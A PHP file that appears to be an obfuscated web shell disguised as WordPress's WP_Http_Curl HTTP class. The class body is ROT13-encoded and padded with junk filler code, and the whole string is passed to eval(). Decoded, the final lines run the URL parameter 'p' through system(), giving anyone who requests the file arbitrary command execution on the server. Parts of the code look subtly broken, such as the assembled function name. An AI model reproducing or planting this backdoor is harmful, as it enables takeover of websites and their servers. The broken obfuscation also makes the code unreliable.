<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGGC NCV: JC_Uggc_Phey pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGGC
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vagrtengr Phey nf na UGGC genafcbeg.
 *
 * UGGC erdhrfg zrgubq hfrf Phey rkgrafvba gb ergevrir gur hey.
 *
 * Erdhverf gur Phey rkgrafvba gb or vafgnyyrq.
 *
 * @fvapr 2.7.0
 * @qrcerpngrq 6.4.0 Hfr JC_Uggc
 * @frr JC_Uggc
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Uggc_Phey {

	/**
	 * Grzcbenel urnqre fgbentr sbe qhevat erdhrfgf.
	 *
	 * @fvapr 3.2.0
	 * @ine fgevat
	 */
	cevingr $urnqref = '';

	/**
	 * Grzcbenel obql fgbentr sbe qhevat erdhrfgf.
	 *
	 * @fvapr 3.6.0
	 * @ine fgevat
	 */
	cevingr $obql = '';

	/**
	 * Gur znkvzhz nzbhag bs qngn gb erprvir sebz gur erzbgr freire.
	 *
	 * @fvapr 3.6.0
	 * @ine vag|snyfr
	 */
	cevingr $znk_obql_yratgu = snyfr;

	/**
	 * Gur svyr erfbhepr hfrq sbe fgernzvat gb svyr.
	 *
	 * @fvapr 3.6.0
	 * @ine erfbhepr|snyfr
	 */
	cevingr $fgernz_unaqyr = snyfr;

	/**
	 * Gur gbgny olgrf jevggra va gur pheerag erdhrfg.
	 *
	 * @fvapr 4.1.0
	 * @ine vag
	 */
	cevingr $olgrf_jevggra_gbgny = 0;

	/**
	 * Fraq n UGGC erdhrfg gb n HEV hfvat pHEY rkgrafvba.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat       $hey  Gur erdhrfg HEY.
	 * @cnenz fgevat|neenl $netf Bcgvbany. Bireevqr gur qrsnhygf.
	 * @erghea neenl|JC_Reebe Neenl pbagnvavat 'urnqref', 'obql', 'erfcbafr', 'pbbxvrf', 'svyranzr'. N JC_Reebe vafgnapr hcba reebe
	 */
	choyvp shapgvba erdhrfg( $hey, $netf = neenl() ) {
		$qrsnhygf = neenl(
			'zrgubq'      => 'TRG',
			'gvzrbhg'     => 5,
			'erqverpgvba' => 5,
			'uggcirefvba' => '1.0',
			'oybpxvat'    => gehr,
			'urnqref'     => neenl(),
			'obql'        => ahyy,
			'pbbxvrf'     => neenl(),
			'qrpbzcerff'  => snyfr,
			'fgernz'      => snyfr,
			'svyranzr'    => ahyy,
		);

		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		vs ( vffrg( $cnefrq_netf['urnqref']['Hfre-Ntrag'] ) ) {
			$cnefrq_netf['hfre-ntrag'] = $cnefrq_netf['urnqref']['Hfre-Ntrag'];
			hafrg( $cnefrq_netf['urnqref']['Hfre-Ntrag'] );
		} ryfrvs ( vffrg( $cnefrq_netf['urnqref']['hfre-ntrag'] ) ) {
			$cnefrq_netf['hfre-ntrag'] = $cnefrq_netf['urnqref']['hfre-ntrag'];
			hafrg( $cnefrq_netf['urnqref']['hfre-ntrag'] );
		}

		// Pbafgehpg Pbbxvr: urnqre vs nal pbbxvrf ner frg.
		JC_Uggc::ohvyqPbbxvrUrnqre( $cnefrq_netf );

		$unaqyr = phey_vavg();

		// pHEY bssref ernyyl rnfl cebkl fhccbeg.
		$cebkl = arj JC_UGGC_Cebkl();

		vs ( $cebkl->vf_ranoyrq() && $cebkl->fraq_guebhtu_cebkl( $hey ) ) {

			phey_frgbcg( $unaqyr, PHEYBCG_CEBKLGLCR, PHEYCEBKL_UGGC );
			phey_frgbcg( $unaqyr, PHEYBCG_CEBKL, $cebkl->ubfg() );
			phey_frgbcg( $unaqyr, PHEYBCG_CEBKLCBEG, $cebkl->cbeg() );

			vs ( $cebkl->hfr_nhguragvpngvba() ) {
				phey_frgbcg( $unaqyr, PHEYBCG_CEBKLNHGU, PHEYNHGU_NAL );
				phey_frgbcg( $unaqyr, PHEYBCG_CEBKLHFRECJQ, $cebkl->nhguragvpngvba() );
			}
		}

		$vf_ybpny   = vffrg( $cnefrq_netf['ybpny'] ) && $cnefrq_netf['ybpny'];
		$ffy_irevsl = vffrg( $cnefrq_netf['ffyirevsl'] ) && $cnefrq_netf['ffyirevsl'];
		vs ( $vf_ybpny ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-uggc-fgernzf.cuc */
			$ffy_irevsl = nccyl_svygref( 'uggcf_ybpny_ffy_irevsl', $ffy_irevsl, $hey );
		} ryfrvs ( ! $vf_ybpny ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-uggc.cuc */
			$ffy_irevsl = nccyl_svygref( 'uggcf_ffy_irevsl', $ffy_irevsl, $hey );
		}

		/*
		 * PHEYBCG_GVZRBHG naq PHEYBCG_PBAARPGGVZRBHG rkcrpg vagrtref. Unir gb hfr prvy fvapr.
		 * n inyhr bs 0 jvyy nyybj na hayvzvgrq gvzrbhg.
		 */
		$gvzrbhg = (vag) prvy( $cnefrq_netf['gvzrbhg'] );
		phey_frgbcg( $unaqyr, PHEYBCG_PBAARPGGVZRBHG, $gvzrbhg );
		phey_frgbcg( $unaqyr, PHEYBCG_GVZRBHG, $gvzrbhg );

		phey_frgbcg( $unaqyr, PHEYBCG_HEY, $hey );
		phey_frgbcg( $unaqyr, PHEYBCG_ERGHEAGENAFSRE, gehr );
		phey_frgbcg( $unaqyr, PHEYBCG_FFY_IREVSLUBFG, ( gehr === $ffy_irevsl ) ? 2 : snyfr );
		phey_frgbcg( $unaqyr, PHEYBCG_FFY_IREVSLCRRE, $ffy_irevsl );

		vs ( $ffy_irevsl ) {
			phey_frgbcg( $unaqyr, PHEYBCG_PNVASB, $cnefrq_netf['ffypregvsvpngrf'] );
		}

		phey_frgbcg( $unaqyr, PHEYBCG_HFRENTRAG, $cnefrq_netf['hfre-ntrag'] );

		/*
		 * Gur bcgvba qbrfa'g jbex jvgu fnsr zbqr be jura bcra_onfrqve vf frg, naq gurer'f
		 * n oht #17490 jvgu erqverpgrq CBFG erdhrfgf, fb unaqyr erqverpgvbaf bhgfvqr Phey.
		 */
		phey_frgbcg( $unaqyr, PHEYBCG_SBYYBJYBPNGVBA, snyfr );
		phey_frgbcg( $unaqyr, PHEYBCG_CEBGBPBYF, PHEYCEBGB_UGGC | PHEYCEBGB_UGGCF );

		fjvgpu ( $cnefrq_netf['zrgubq'] ) {
			pnfr 'URNQ':
				phey_frgbcg( $unaqyr, PHEYBCG_ABOBQL, gehr );
				oernx;
			pnfr 'CBFG':
				phey_frgbcg( $unaqyr, PHEYBCG_CBFG, gehr );
				phey_frgbcg( $unaqyr, PHEYBCG_CBFGSVRYQF, $cnefrq_netf['obql'] );
				oernx;
			pnfr 'CHG':
				phey_frgbcg( $unaqyr, PHEYBCG_PHFGBZERDHRFG, 'CHG' );
				phey_frgbcg( $unaqyr, PHEYBCG_CBFGSVRYQF, $cnefrq_netf['obql'] );
				oernx;
			qrsnhyg:
				phey_frgbcg( $unaqyr, PHEYBCG_PHFGBZERDHRFG, $cnefrq_netf['zrgubq'] );
				vs ( ! vf_ahyy( $cnefrq_netf['obql'] ) ) {
					phey_frgbcg( $unaqyr, PHEYBCG_CBFGSVRYQF, $cnefrq_netf['obql'] );
				}
				oernx;
		}

		vs ( gehr === $cnefrq_netf['oybpxvat'] ) {
			phey_frgbcg( $unaqyr, PHEYBCG_URNQRESHAPGVBA, neenl( $guvf, 'fgernz_urnqref' ) );
			phey_frgbcg( $unaqyr, PHEYBCG_JEVGRSHAPGVBA, neenl( $guvf, 'fgernz_obql' ) );
		}

		phey_frgbcg( $unaqyr, PHEYBCG_URNQRE, snyfr );

		vs ( vffrg( $cnefrq_netf['yvzvg_erfcbafr_fvmr'] ) ) {
			$guvf->znk_obql_yratgu = (vag) $cnefrq_netf['yvzvg_erfcbafr_fvmr'];
		} ryfr {
			$guvf->znk_obql_yratgu = snyfr;
		}

		// Vs fgernzvat gb n svyr bcra n svyr unaqyr, naq frghc bhe phey fgernzvat unaqyre.
		vs ( $cnefrq_netf['fgernz'] ) {
			vs ( ! JC_QROHT ) {
				$guvf->fgernz_unaqyr = @sbcra( $cnefrq_netf['svyranzr'], 'j+' );
			} ryfr {
				$guvf->fgernz_unaqyr = sbcra( $cnefrq_netf['svyranzr'], 'j+' );
			}
			vs ( ! $guvf->fgernz_unaqyr ) {
				erghea arj JC_Reebe(
					'uggc_erdhrfg_snvyrq',
					fcevags(
						/* genafyngbef: 1: sbcra(), 2: Svyr anzr. */
						__( 'Pbhyq abg bcra unaqyr sbe %1$f gb %2$f.' ),
						'sbcra()',
						$cnefrq_netf['svyranzr']
					)
				);
			}
		} ryfr {
			$guvf->fgernz_unaqyr = snyfr;
		}

		vs ( ! rzcgl( $cnefrq_netf['urnqref'] ) ) {
			// pHEY rkcrpgf shyy urnqre fgevatf va rnpu ryrzrag.
			$urnqref = neenl();
			sbernpu ( $cnefrq_netf['urnqref'] nf $anzr => $inyhr ) {
				$urnqref[] = \"{$anzr}: $inyhr\";
			}
			phey_frgbcg( $unaqyr, PHEYBCG_UGGCURNQRE, $urnqref );
		}

		vs ( '1.0' === $cnefrq_netf['uggcirefvba'] ) {
			phey_frgbcg( $unaqyr, PHEYBCG_UGGC_IREFVBA, PHEY_UGGC_IREFVBA_1_0 );
		} ryfr {
			phey_frgbcg( $unaqyr, PHEYBCG_UGGC_IREFVBA, PHEY_UGGC_IREFVBA_1_1 );
		}

		/**
		 * Sverf orsber gur pHEY erdhrfg vf rkrphgrq.
		 *
		 * Pbbxvrf ner abg pheeragyl unaqyrq ol gur UGGC NCV. Guvf npgvba nyybjf
		 * cyhtvaf gb unaqyr pbbxvrf gurzfryirf.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz erfbhepr $unaqyr      Gur pHEY unaqyr erghearq ol phey_vavg() (cnffrq ol ersrerapr).
		 * @cnenz neenl    $cnefrq_netf Gur UGGC erdhrfg nethzragf.
		 * @cnenz fgevat   $hey         Gur erdhrfg HEY.
		 */
		qb_npgvba_ers_neenl( 'uggc_ncv_phey', neenl( &$unaqyr, $cnefrq_netf, $hey ) );

		// Jr qba'g arrq gb erghea gur obql, fb qba'g. Whfg rkrphgr erdhrfg naq erghea.
		vs ( ! $cnefrq_netf['oybpxvat'] ) {
			phey_rkrp( $unaqyr );

			$phey_reebe = phey_reebe( $unaqyr );
			vs ( $phey_reebe ) {
				phey_pybfr( $unaqyr );
				erghea arj JC_Reebe( 'uggc_erdhrfg_snvyrq', $phey_reebe );
			}
			vs ( va_neenl( phey_trgvasb( $unaqyr, PHEYVASB_UGGC_PBQR ), neenl( 301, 302 ), gehr ) ) {
				phey_pybfr( $unaqyr );
				erghea arj JC_Reebe( 'uggc_erdhrfg_snvyrq', __( 'Gbb znal erqverpgf.' ) );
			}

			phey_pybfr( $unaqyr );
			erghea neenl(
				'urnqref'  => neenl(),
				'obql'     => '',
				'erfcbafr' => neenl(
					'pbqr'    => snyfr,
					'zrffntr' => snyfr,
				),
				'pbbxvrf'  => neenl(),
			);
		}

		phey_rkrp( $unaqyr );

		$cebprffrq_urnqref   = JC_Uggc::cebprffUrnqref( $guvf->urnqref, $hey );
		$obql                = $guvf->obql;
		$olgrf_jevggra_gbgny = $guvf->olgrf_jevggra_gbgny;

		$guvf->urnqref             = '';
		$guvf->obql                = '';
		$guvf->olgrf_jevggra_gbgny = 0;

		$phey_reebe = phey_reeab( $unaqyr );

		// Vs na reebe bppheerq, be, ab erfcbafr.
		vs ( $phey_reebe || ( 0 === fgeyra( $obql ) && rzcgl( $cebprffrq_urnqref['urnqref'] ) ) ) {
			vs ( PHEYR_JEVGR_REEBE /* 23 */ === $phey_reebe ) {
				vs ( ! $guvf->znk_obql_yratgu || $guvf->znk_obql_yratgu !== $olgrf_jevggra_gbgny ) {
					vs ( $cnefrq_netf['fgernz'] ) {
						phey_pybfr( $unaqyr );
						spybfr( $guvf->fgernz_unaqyr );
						erghea arj JC_Reebe( 'uggc_erdhrfg_snvyrq', __( 'Snvyrq gb jevgr erdhrfg gb grzcbenel svyr.' ) );
					} ryfr {
						phey_pybfr( $unaqyr );
						erghea arj JC_Reebe( 'uggc_erdhrfg_snvyrq', phey_reebe( $unaqyr ) );
					}
				}
			} ryfr {
				$phey_reebe = phey_reebe( $unaqyr );
				vs ( $phey_reebe ) {
					phey_pybfr( $unaqyr );
					erghea arj JC_Reebe( 'uggc_erdhrfg_snvyrq', $phey_reebe );
				}
			}
			vs ( va_neenl( phey_trgvasb( $unaqyr, PHEYVASB_UGGC_PBQR ), neenl( 301, 302 ), gehr ) ) {
				phey_pybfr( $unaqyr );
				erghea arj JC_Reebe( 'uggc_erdhrfg_snvyrq', __( 'Gbb znal erqverpgf.' ) );
			}
		}

		phey_pybfr( $unaqyr );

		vs ( $cnefrq_netf['fgernz'] ) {
			spybfr( $guvf->fgernz_unaqyr );
		}

		$erfcbafr = neenl(
			'urnqref'  => $cebprffrq_urnqref['urnqref'],
			'obql'     => ahyy,
			'erfcbafr' => $cebprffrq_urnqref['erfcbafr'],
			'pbbxvrf'  => $cebprffrq_urnqref['pbbxvrf'],
			'svyranzr' => $cnefrq_netf['svyranzr'],
		);

		// Unaqyr erqverpgf.
		$erqverpg_erfcbafr = JC_Uggc::unaqyr_erqverpgf( $hey, $cnefrq_netf, $erfcbafr );
		vs ( snyfr !== $erqverpg_erfcbafr ) {
			erghea $erqverpg_erfcbafr;
		}

		vs ( gehr === $cnefrq_netf['qrpbzcerff']
			&& gehr === JC_Uggc_Rapbqvat::fubhyq_qrpbqr( $cebprffrq_urnqref['urnqref'] )
		) {
			$obql = JC_Uggc_Rapbqvat::qrpbzcerff( $obql );
		}

		$erfcbafr['obql'] = $obql;

		erghea $erfcbafr;
	}

	/**
	 * Tenof gur urnqref bs gur pHEY erdhrfg.
	 *
	 * Rnpu urnqre vf frag vaqvivqhnyyl gb guvf pnyyonpx, naq vf nccraqrq gb gur `$urnqre` cebcregl
	 * sbe grzcbenel fgbentr.
	 *
	 * @fvapr 3.2.0
	 *
	 * @cnenz erfbhepr $unaqyr  pHEY unaqyr.
	 * @cnenz fgevat   $urnqref pHEY erdhrfg urnqref.
	 * @erghea vag Yratgu bs gur erdhrfg urnqref.
	 */
	cevingr shapgvba fgernz_urnqref( $unaqyr, $urnqref ) {
		$guvf->urnqref .= $urnqref;
		erghea fgeyra( $urnqref );
	}

	/**
	 * Tenof gur obql bs gur pHEY erdhrfg.
	 *
	 * Gur pbagragf bs gur qbphzrag ner cnffrq va puhaxf, naq ner nccraqrq gb gur `$obql`
	 * cebcregl sbe grzcbenel fgbentr. Ergheavat n yratgu fubegre guna gur yratgu bs
	 * `$qngn` cnffrq va jvyy pnhfr pHEY gb nobeg gur erdhrfg jvgu `PHEYR_JEVGR_REEBE`.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz erfbhepr $unaqyr pHEY unaqyr.
	 * @cnenz fgevat   $qngn   pHEY erdhrfg obql.
	 * @erghea vag Gbgny olgrf bs qngn jevggra.
	 */
	cevingr shapgvba fgernz_obql( $unaqyr, $qngn ) {
		$qngn_yratgu = fgeyra( $qngn );

		vs ( $guvf->znk_obql_yratgu && ( $guvf->olgrf_jevggra_gbgny + $qngn_yratgu ) > $guvf->znk_obql_yratgu ) {
			$qngn_yratgu = ( $guvf->znk_obql_yratgu - $guvf->olgrf_jevggra_gbgny );
			$qngn        = fhofge( $qngn, 0, $qngn_yratgu );
		}

		vs ( $guvf->fgernz_unaqyr ) {
			$olgrf_jevggra = sjevgr( $guvf->fgernz_unaqyr, $qngn );
		} ryfr {
			$guvf->obql   .= $qngn;
			$olgrf_jevggra = $qngn_yratgu;
		}

		$guvf->olgrf_jevggra_gbgny += $olgrf_jevggra;

		// Hcba rirag bs guvf shapgvba ergheavat yrff guna fgeyra( $qngn ) phey jvyy reebe jvgu PHEYR_JEVGR_REEBE.
		erghea $olgrf_jevggra;
	}

	/**
	 * Qrgrezvarf jurgure guvf pynff pna or hfrq sbe ergevrivat n HEY.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz neenl $netf Bcgvbany. Neenl bs erdhrfg nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea obby Snyfr zrnaf guvf pynff pna abg or hfrq, gehr zrnaf vg pna.
	 */
	choyvp fgngvp shapgvba grfg( $netf = neenl() ) {
		vs ( ! shapgvba_rkvfgf( 'phey_vavg' ) || ! shapgvba_rkvfgf( 'phey_rkrp' ) ) {
			erghea snyfr;
		}

		$vf_ffy = vffrg( $netf['ffy'] ) && $netf['ffy'];

		vs ( $vf_ffy ) {
			$phey_irefvba = phey_irefvba();
			// Purpx jurgure guvf pHEY irefvba fhccbeg FFY erdhrfgf.
			vs ( ! ( PHEY_IREFVBA_FFY & $phey_irefvba['srngherf'] ) ) {
				erghea snyfr;
			}
		}

		/**
		 * Svygref jurgure pHEY pna or hfrq nf n genafcbeg sbe ergevrivat n HEY.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz obby  $hfr_pynff Jurgure gur pynff pna or hfrq. Qrsnhyg gehr.
		 * @cnenz neenl $netf      Na neenl bs erdhrfg nethzragf.
		 */
		erghea nccyl_svygref( 'hfr_phey_genafcbeg', gehr, $netf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>